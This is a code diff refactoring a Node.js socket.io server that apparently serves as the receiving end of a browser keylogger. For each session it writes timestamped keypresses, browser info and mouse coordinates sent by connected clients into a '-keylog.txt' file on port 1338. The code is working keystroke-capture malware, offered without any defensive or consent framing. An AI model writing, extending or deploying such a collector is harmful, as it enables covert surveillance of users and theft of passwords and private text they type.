@@ -10,45 +10,42 @@ const Timestamp = function(started){
     return ms(current - started);
 }
 
-io.on('connection', function (socket) {
+io.on('connection', (socket) => {
 
-  let started = Date.now();
+  let startedAt = Date.now();
   let date = new Date();
   date = `${date.getFullYear()}_${date.getHours()}_${date.getMinutes()}`;
 
   // start writing to a file when a new session starts
-  console.log('session started');
+  console.log(`session started on ${new Date()}`);
   let keystream = fs.createWriteStream(dir + date + '-keylog.txt', {
     flags: 'a'
   });
 
   keystream.write(`--- session started --- \r\n`);
 
-  socket.on('info', function(info){
+  socket.on('info', (info) => {
     keystream.write(`Browser is ${info} \r\n`);
   });
 
   // on keypress, write the contents to a file
-  socket.on('keypress', function (contents) {
-    let timestamp = Timestamp(started);
-    keystream.write(`${timestamp}~ ${contents} \r\n`);
+  socket.on('keypress', (contents) => {
+    keystream.write(`${Timestamp(startedAt)}~ ${contents} \r\n`);
   });
 
   // on mousemove, write the contents to a file
-  socket.on('mousemove', function (contents) {
-    let timestamp = Timestamp(started);
+  socket.on('mousemove', (contents) => {
     let input = JSON.parse(contents);
-    keystream.write(`[click] at ${timestamp}~ X:${input.x} Y: ${input.y} \r\n`);
+    keystream.write(`[click] at ${Timestamp(startedAt)}~ X:${input.x} Y: ${input.y} \r\n`);
   });
 
   // once the user has disconnected, save the file and end the stream
-  socket.on('disconnect', function () {
-    console.log('session disconnected');
-    let timestamp = Timestamp(started);
-    keystream.write(` --- session disconnected after ${timestamp} --- \r\n`);
+  socket.on('disconnect', () => {
+    console.log(`session ended after ${Timestamp(startedAt)}`);
+    keystream.write(` --- session disconnected after ${Timestamp(startedAt)} --- \r\n`);
     keystream.end(); // save the file;
   });
 });
 
 server.listen(1338);
-console.log("server started");
+console.log(`server started on ${new Date()}`);
